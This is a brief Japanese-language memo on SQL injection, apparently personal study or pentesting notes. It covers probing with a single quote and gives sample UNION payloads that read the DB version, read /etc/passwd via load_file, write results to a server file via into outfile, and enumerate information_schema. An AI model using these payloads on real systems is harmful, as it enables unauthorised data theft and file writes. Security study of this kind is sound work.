# SQLi

## 検証方法

* 入力値に`'`を入力してエラーの有無を検証
* エラーが帰らない場合もある。
* 表示されるエラーからドキュメントルート等のディレクトリ情報がある場合がある。

## サンプル

* `' union select version() ; #` でdbのバージョン表示 
* `' union select load_file('/etc/passwd'); #`　で`/etc/passwd`のファイル内を表示
* `' union select column_name from table_name into outfile '/data/mariadb/test.html' fields terminated by ',' optionally enclosed by '"'; #`でsqlの結果を/data/mariadb/test.htmlに出力(カンマ区切りで"で値を囲む)
* `' union select table_name,column_name from information_schema.columns; #` でテーブル名とカラム名を取得
